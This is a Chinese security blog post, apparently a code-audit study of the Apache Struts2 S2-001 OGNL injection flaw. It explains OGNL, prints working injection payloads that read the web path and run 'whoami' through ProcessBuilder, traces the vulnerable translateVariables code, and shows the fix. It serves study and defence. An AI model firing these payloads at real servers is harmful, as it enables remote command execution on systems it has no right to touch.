@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Struts2-001 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Struts2-001</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-01-28 20:22:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    <b>#</b> Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Struts2/" title="Struts2">
+                    <b>#</b> Struts2
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="ognl表达式"><a class="markdownIt-Anchor" href="#ognl表达式">#</a> OGNL 表达式</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</span><br><span class="line"></span><br><span class="line">1、表达式（Expression）</span><br><span class="line"></span><br><span class="line">表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。</span><br><span class="line"></span><br><span class="line">2、根对象（Root Object）</span><br><span class="line"></span><br><span class="line">根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name 属性值）。</span><br><span class="line"></span><br><span class="line">3、上下文环境（Context）</span><br><span class="line"></span><br><span class="line">有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。</span><br><span class="line">OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root</span><br><span class="line">Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root</span><br><span class="line">Object）的存取操作的表达式是不需要增加 #符号进行区分的。</span><br></pre></td></tr></table></figure>
+<p>对表达式的简单使用说明</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. 基本对象树的访问</span><br><span class="line">对象树的访问就是通过使用点号将对象的引用串联起来进行。</span><br><span class="line">例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">2. 对容器变量的访问</span><br><span class="line">对容器变量的访问，通过#符号加上表达式进行。</span><br><span class="line">例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">3. 使用操作符号</span><br><span class="line">OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。</span><br><span class="line"></span><br><span class="line">4. 容器、数组、对象</span><br><span class="line">OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]</span><br><span class="line">同时，OGNL支持对Map的按键值查找：</span><br><span class="line">例如：#session[&#x27;mySessionPropKey&#x27;]</span><br><span class="line">不仅如此，OGNL还支持容器的构造的表达式：</span><br><span class="line">例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map</span><br><span class="line">你也可以通过任意类对象的构造函数进行对象新建</span><br><span class="line">例如：new Java.net.URL(&quot;xxxxxx/&quot;)</span><br><span class="line"></span><br><span class="line">5. 对静态方法或变量的访问</span><br><span class="line">要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：</span><br><span class="line"></span><br><span class="line">6. 方法调用</span><br><span class="line">直接通过类似Java的方法调用方式进行，你甚至可以传递参数：</span><br><span class="line">例如：user.getName()，group.users.size()，group.containsUser(#requestUser)</span><br><span class="line"></span><br><span class="line">7. 投影和选择</span><br><span class="line">OGNL支持类似数据库中的投影（projection） 和选择（selection）。</span><br><span class="line">投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。</span><br><span class="line">例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。</span><br><span class="line">选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</span><br><span class="line">? 选择满足条件的所有元素</span><br><span class="line">^ 选择满足条件的第一个元素</span><br><span class="line">$ 选择满足条件的最后一个元素</span><br><span class="line">例如：group.userList.&#123;? #txxx.xxx != null&#125;将获得某个group中user的name不为空的user的列表。</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h3>
+<p>获取 web 路径</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149936.png" alt="image-20230605114857778"></p>
+<p>rce</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149921.png" alt="image-20230605114921788"></p>
+<h3 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h3>
+<p>漏洞点：</p>
+<p>xwork-2.0.3-sources.jar!\com\opensymphony\xwork2\util\TextParseUtil.java</p>
+<p>在 while 下打上断点</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149965.png" alt="image-20230605114938789"></p>
+<p>这里为了方便我就把执行换成 username</p>
+<p>debug 三轮，index.jsp→login→name→%{name} 就到了</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149702.png" alt="image-20230605114950361"> 首先是遍历 expression:login</p>
+<p>接着就是 username</p>
+<p>开始分析</p>
+<p>走到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure>
+<p 1+2="">获得对象 o，值为 %</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150064.png" alt="image-20230605115003612">o 对象不为空进入循环</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150771.png" alt="image-20230605115016574"></p>
+<p>再进入 TextUtils.stringSet 检查字符串是否设置为 null 或””</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stringSet</span><span class="params">(String string)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (string != <span class="literal">null</span>) &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其实第一次看到这个方法以为是 String 值设置，直接返回空？</p>
+<p>但是注释写的是判断。。。</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150025.png" alt="image-20230605115032838"></p>
+<p 1+2="">然后从这一步开始，值就被解析为 %</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150708.png" alt="image-20230605115050580"></p>
+<p>再一次循环就解析结果了</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151721.png" alt="image-20230605115101579"></p>
+<p>实际上就是 translateVariables 下，递归解析 OGNL 表达式，对输入的 %{1+2} 继续解析导致被恶意利用</p>
+<h3 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="type">int</span> maxLoopCount)</span> &#123;</span><br><span class="line">    <span class="comment">// deal with the &quot;pure&quot; expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loopCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">middle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="literal">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="literal">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>判断了循环的次数，从而在解析到 %{1+1} 的时候不会继续向下递归</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-01-28 20:22:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        <b>#</b> Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Struts2/" title="Struts2">
+                        <b>#</b> Struts2
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/01/30/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text"> OGNL 表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text"> 代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text"> 漏洞修复</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
